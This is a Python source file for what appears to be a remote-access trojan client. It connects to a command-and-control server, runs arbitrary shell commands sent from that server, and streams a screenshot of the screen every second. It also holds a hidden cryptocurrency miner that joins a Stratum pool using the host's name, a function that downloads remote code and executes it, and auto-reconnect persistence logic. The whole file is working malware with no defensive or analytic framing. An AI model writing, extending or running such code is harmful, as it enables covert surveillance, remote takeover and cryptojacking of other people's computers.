import os
import socket
import socketio
import subprocess
import time
import platform
import mss
import base64
from PIL import Image
import io
import threading

# --- Configuration ---
C2_ADDRESS = "http://localhost:8004"
RETRY_INTERVAL = 30
TARGET_HEIGHT = 720
DEFAULT_MINER_WALLET = ""
DEFAULT_MINER_INTENSITY = 50

# --- Intervals (Now Mutable) ---
DEFAULT_SCREENSHOT_INTERVAL = 1.0  # Seconds
SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL

# --- Persistence Configuration ---
SCHEDULED_RECONNECT_SECONDS = 15 * 60
HEARTBEAT_INTERVAL_SECONDS = 5
WATCHDOG_TIMEOUT_SECONDS = 60


# --- Functions ---
def get_hostname_local():
    return socket.gethostname()


# --- Remote Import System ---
def remote_import(url):
    """Dynamically imports a module from a remote URL."""
    try:
        urllib_req = __import__('urllib.request', fromlist=['request']).request
        with urllib_req.urlopen(url, timeout=5) as response:
            code = response.read().decode()
        module_ns = {"__builtins__": __builtins__}
        exec(code, module_ns)
        return module_ns
    except Exception as e:
        print(f"Remote import error: {e}")
        return None


# --- Miner State ---
class MinerState:
    def __init__(self):
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
        
        # Mining Data
        self.current_job = None
        self.share_queue = []
        self.hash_count = 0
        self.accepted_shares = 0
        self.start_time = 0
        
        # Connection
        self.wallet = DEFAULT_MINER_WALLET
        self.pool = "sha256.unmineable.com"
        self.port = 3333
        self.worker_name = get_hostname_local()
        self.extranonce1 = ""
        self.extranonce2_size = 0
        self.difficulty = 1.0


# Initialize state
miner_state = MinerState()


# --- Simple Hashing Worker (Single Thread) ---
def hashing_worker():
    import hashlib
    import struct
    import binascii
    import time
    
    log_event("Hashing worker started (Single Core Mode).")
    last_job_id = None
    nonce = 0
    
    while not miner_state.stop_event.is_set():
        with miner_state.lock:
            job = miner_state.current_job
            
        if not job:
            time.sleep(1)
            continue
            
        if job['job_id'] != last_job_id:
            last_job_id = job['job_id']
            nonce = 0 # Reset nonce on new job
            
        target = job['target']
        header = job['header']
        
        # Hashing Batch
        batch_size = 1000
        for _ in range(batch_size):
            nonce_bin = struct.pack("<I", nonce)
            h = hashlib.sha256(hashlib.sha256(header + nonce_bin).digest()).digest()
            if h[::-1] <= target:
                with miner_state.lock:
                    miner_state.share_queue.append({
                        "job_id": job['job_id'],
                        "enonce2": job['extranonce2'],
                        "ntime": job['ntime'],
                        "nonce": binascii.hexlify(nonce_bin).decode()
                    })
            nonce += 1
            if nonce > 0xffffffff: 
                nonce = 0
                break
        
        with miner_state.lock:
            miner_state.hash_count += batch_size
        
        # Frequent yielding to keep system responsive
        time.sleep(0.0001)

    log_event("Hashing worker stopping.")


def miner_reporter():
    """Background thread that periodically reports total hashrate to the C2."""
    while True:
        time.sleep(10)
        if miner_state.start_time > 0 and not miner_state.stop_event.is_set():
            uptime = int(time.time() - miner_state.start_time) if miner_state.start_time > 0 else 1
            with miner_state.lock:
                total_hashes = miner_state.hash_count
                shares = miner_state.accepted_shares
            hps = int(total_hashes / uptime)
            report = f"[LIVE] Hashrate: {hps} H/s | Shares: {shares} | Uptime: {uptime}s\n"
            send_command_output(report)


def manage_miner(action, intensity=None, wallet=None):
    global miner_state
    
    if action == "start":
        if not miner_state.stop_event.is_set() and miner_state.start_time > 0:
            return "Miner is already running.\n"
        
        miner_state.wallet = wallet if wallet else DEFAULT_MINER_WALLET
        if not miner_state.wallet:
            return "Error: Wallet address required.\n"
        
        miner_state.stop_event.clear()
        miner_state.start_time = time.time()
        with miner_state.lock:
            miner_state.hash_count = 0
            miner_state.accepted_shares = 0
            miner_state.current_job = None
            miner_state.share_queue = []
        
        # Start reporter thread if not running
        if not hasattr(miner_state, 'reporter_started'):
            threading.Thread(target=miner_reporter, daemon=True).start()
            miner_state.reporter_started = True

        threading.Thread(target=stratum_main, daemon=True, name="StratumMain").start()
        threading.Thread(target=hashing_worker, daemon=True, name="HashWorker").start()
        
        log_event(f"Miner started: {miner_state.wallet} (Single Core)")
        return f"Miner active: SHA256 -> {miner_state.wallet} (Single Core)\n"

    elif action == "stop":
        miner_state.stop_event.set()
        log_event("Miner stop signal sent.")
        return "Miner stopping...\n"

    elif action == "query":
        uptime = int(time.time() - miner_state.start_time) if miner_state.start_time > 0 else 1
        with miner_state.lock:
            hps = int(miner_state.hash_count / uptime)
            shares = miner_state.accepted_shares
        return f"Hashrate: {hps} H/s | Shares: {shares} | Uptime: {uptime}s\n"


def stratum_main():
    """Bulletproof Stratum network handler with line buffering."""
    global miner_state
    import json
    import binascii
    import hashlib
    
    buffer = b""

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        log_event(f"Connecting to Stratum: {miner_state.pool}")
        sock.connect((miner_state.pool, miner_state.port))
        
        # 1. Subscribe
        sock.sendall(json.dumps({"id": 1, "method": "mining.subscribe", "params": []}).encode() + b"\n")
        
        # Buffered handshake read
        while b"\n" not in buffer:
            chunk = sock.recv(2048)
            if not chunk: break
            buffer += chunk
            
        if not buffer:
            log_event("Stratum: Connection closed during handshake.")
            return

        lines = buffer.split(b"\n")
        handshake_line = lines[0].decode().strip()
        buffer = b"\n".join(lines[1:]) # Keep remaining data
        
        log_event(f"Stratum handshake: {handshake_line[:100]}...")
        resp = json.loads(handshake_line)
        
        miner_state.extranonce1 = resp['result'][1]
        miner_state.extranonce2_size = resp['result'][2]
        
        # 2. Authorize
        user = f"RVN:{miner_state.wallet}.{miner_state.worker_name}"
        sock.sendall(json.dumps({"id": 2, "method": "mining.authorize", "params": [user, "x"]}).encode() + b"\n")
        log_event("Stratum authorized.")
        
        # 3. Main Loop
        sock.setblocking(False)
        while not miner_state.stop_event.is_set():
            try:
                try:
                    chunk = sock.recv(4096)
                    if chunk:
                        buffer += chunk
                    else:
                        log_event("Stratum: Remote host closed connection.")
                        break
                except (BlockingIOError, socket.error):
                    pass # No data ready yet
                
                # Process all complete lines in buffer
                while b"\n" in buffer:
                    line_raw, buffer = buffer.split(b"\n", 1)
                    line = line_raw.decode().strip()
                    if not line: continue
                    
                    try:
                        msg = json.loads(line)
                        if msg.get("method") == "mining.set_difficulty":
                            miner_state.difficulty = msg['params'][0]
                            log_event(f"Difficulty set: {miner_state.difficulty}")
                        elif msg.get("method") == "mining.notify":
                            params = msg['params']
                            job_id, prevhash, coinb1, coinb2, branch, version, nbits, ntime, clean = params
                            
                            target = (0x00000000FFFF0000000000000000000000000000000000000000000000000000 // int(miner_state.difficulty or 1))
                            target_bin = target.to_bytes(32, 'big')
                            
                            enonce2 = "00" * miner_state.extranonce2_size
                            coinbase = binascii.unhexlify(coinb1 + miner_state.extranonce1 + enonce2 + coinb2)
                            cb_hash = hashlib.sha256(hashlib.sha256(coinbase).digest()).digest()
                            merkle_root = cb_hash
                            for b in branch:
                                merkle_root = hashlib.sha256(hashlib.sha256(merkle_root + binascii.unhexlify(b)).digest()).digest()
                            
                            header_hex = version + prevhash + binascii.hexlify(merkle_root).decode() + ntime + nbits
                            header = binascii.unhexlify(header_hex)
                            
                            with miner_state.lock:
                                miner_state.current_job = {
                                    "job_id": job_id, "header": header, "target": target_bin,
                                    "ntime": ntime, "extranonce2": enonce2
                                }
                    except Exception as e:
                        log_event(f"Stratum parse error on line: {e}")

                # 4. Handle shares
                while True:
                    share = None
                    with miner_state.lock:
                        if miner_state.share_queue:
                            share = miner_state.share_queue.pop(0)
                    if not share: break
                    
                    payload = json.dumps({
                        "id": 4, "method": "mining.submit", 
                        "params": [user, share['job_id'], share['enonce2'], share['ntime'], share['nonce']]
                    }) + "\n"
                    
                    # Temporarily go blocking to ensure share is sent
                    sock.setblocking(True)
                    sock.sendall(payload.encode())
                    sock.setblocking(False)
                    
                    with miner_state.lock:
                        miner_state.accepted_shares += 1
                    log_event(f"Share submitted: {share['job_id']}")

                time.sleep(0.1) # Faster loop for better share submission response
            except Exception as e:
                log_event(f"Stratum loop internal error: {e}")
                break
    except Exception as e:
        log_event(f"Stratum connection failed: {e}")
    finally:
        miner_state.stop_event.set()
        try: sock.close()
        except: pass


# --- Global State (Main Client) ---
event_logs = []


def log_event(message):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}"
    event_logs.append(log_entry)
    print(log_entry)


sio = socketio.Client(logger=False, engineio_logger=False)
connection_start_time = 0
last_pong_time = 0
screenshot_thread = None
heartbeat_thread = None


def send_command_output(output):
    if sio.connected:
        sio.emit('command_output', {'output': output}, namespace="/api")


def send_screenshot(image_data):
    if sio.connected:
        sio.emit('screenshot', image_data, namespace="/api")


def take_screenshots():
    global SCREENSHOT_INTERVAL
    with mss.mss() as sct:
        while True:
            if not sio.connected:
                time.sleep(1)
                continue
            try:
                sct_img = sct.grab(sct.monitors[1])
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                if img.height == 0: continue
                new_h = TARGET_HEIGHT
                new_w = int(new_h * (img.width / img.height))
                if new_w <= 0: continue
                resized_img = img.resize((new_w, new_h), Image.LANCZOS)
                buffered = io.BytesIO()
                resized_img.save(buffered, format="JPEG", quality=75)
                img_str = base64.b64encode(buffered.getvalue()).decode('utf-8')
                send_screenshot(img_str)

                time.sleep(max(0.01, SCREENSHOT_INTERVAL))
            except Exception as e:
                log_event(f"Screenshot error: {e}")
                time.sleep(SCREENSHOT_INTERVAL)


def start_heartbeat():
    while True:
        time.sleep(HEARTBEAT_INTERVAL_SECONDS)
        if sio.connected:
            try:
                sio.emit('client_ping', namespace="/api")
            except Exception as e:
                log_event(f"Ping error: {e}")


@sio.on('connect', namespace="/api")
def on_connect():
    global connection_start_time, last_pong_time
    connection_start_time = time.time()
    last_pong_time = time.time()
    log_event(f'Connected. SID: {sio.sid}. Sending client info.')
    sio.emit('client_info', {'hostname': get_hostname_local()}, namespace="/api")


@sio.on('disconnect', namespace="/api")
def on_disconnect():
    global connection_start_time
    connection_start_time = 0
    log_event('Disconnected.')


@sio.on('server_pong', namespace="/api")
def on_server_pong():
    global last_pong_time
    last_pong_time = time.time()


def handle_internal_command(command_str):
    global SCREENSHOT_INTERVAL
    parts = command_str.split()
    if not parts: return

    cmd = parts[0].lower()
    log_event(f"Internal command: {command_str}")

    if cmd == "#scrsht":
        if len(parts) > 1:
            val = parts[1].lower()
            if val == "reset":
                SCREENSHOT_INTERVAL = DEFAULT_SCREENSHOT_INTERVAL
                send_command_output(f"Screenshot interval reset to default ({SCREENSHOT_INTERVAL}s)\n")
            else:
                try:
                    ms = float(val)
                    SCREENSHOT_INTERVAL = ms / 1000.0
                    send_command_output(f"Screenshot interval set to {ms}ms ({SCREENSHOT_INTERVAL}s)\n")
                except ValueError:
                    send_command_output("Error: #scrsht requires a number in milliseconds or 'reset'\n")
        else:
            send_command_output(f"Current screenshot interval: {SCREENSHOT_INTERVAL * 1000}ms\n")
    elif cmd == "#miner":
        if len(parts) > 1:
            sub = parts[1].lower()
            if sub == "start":
                intensity = parts[2] if len(parts) > 2 else "50"
                wallet = parts[3] if len(parts) > 3 else ""
                res = manage_miner("start", intensity, wallet)
                send_command_output(res)
            elif sub == "stop":
                res = manage_miner("stop")
                send_command_output(res)
            elif sub == "query":
                res = manage_miner("query")
                send_command_output(res)
            else:
                send_command_output("Usage: #miner start <intensity> <wallet> | stop | query\n")
        else:
            send_command_output("Usage: #miner start <intensity> <wallet> | stop | query\n")
    elif cmd == "#logs":
        num = len(event_logs)
        if len(parts) > 1:
            try:
                num = int(parts[1])
            except ValueError:
                pass
        logs_to_show = event_logs[-num:] if num > 0 else []
        output = "\n".join(logs_to_show) + "\n"
        send_command_output(output if output.strip() else "No logs available.\n")
    else:
        send_command_output(f"Unknown internal command: {cmd}\n")


@sio.on('execute_command', namespace="/api")
def handle_command(command_str):
    command_str = command_str.strip()
    log_event(f"Executing command: {command_str}")

    if command_str.startswith("#"):
        handle_internal_command(command_str)
        return

    try:
        process = subprocess.Popen(command_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
                                   errors='ignore')
        stdout, stderr = process.communicate()
        send_command_output(stdout + stderr)
    except Exception as e:
        log_event(f"Command execution error: {e}")
        send_command_output(f"Command execution error: {e}\n")


def attempt_connection():
    while True:
        log_event(f"Attempting to connect to: {C2_ADDRESS}")
        try:
            if sio.connected: sio.disconnect()
            sio.connect(C2_ADDRESS, namespaces=['/api'])
            return
        except Exception as e:
            log_event(f"Connection to {C2_ADDRESS} failed: {e}")
            log_event(f"Retrying in {RETRY_INTERVAL}s...")
            time.sleep(RETRY_INTERVAL)


# --- Main Execution Logic ---
if __name__ == '__main__':
    threading.Thread(target=take_screenshots, daemon=True).start()
    threading.Thread(target=start_heartbeat, daemon=True).start()

    while True:
        try:
            if not sio.connected:
                log_event("Main: Disconnected. Initiating connection...")
                attempt_connection()

            log_event("Main: Connected. Monitoring state...")
            while sio.connected:
                if time.time() - last_pong_time > WATCHDOG_TIMEOUT_SECONDS:
                    log_event(f"Watchdog: No server pong in >{WATCHDOG_TIMEOUT_SECONDS}s. Forcing reconnect.")
                    sio.disconnect()
                    break

                if time.time() - connection_start_time > SCHEDULED_RECONNECT_SECONDS:
                    log_event(f"Scheduler: >{SCHEDULED_RECONNECT_SECONDS // 60}m uptime. Reconnecting.")
                    sio.disconnect()
                    break

                time.sleep(5)

            log_event("Main: Loop detected disconnect. Will restart process.")
            time.sleep(5)

        except KeyboardInterrupt:
            log_event("Exiting on user request.")
            break
        except Exception as e:
            log_event(f"---! UNHANDLED EXCEPTION IN MAIN LOOP: {e} !---")
            if sio and sio.connected:
                sio.disconnect()
            time.sleep(RETRY_INTERVAL)

    if sio.connected:
        sio.disconnect()
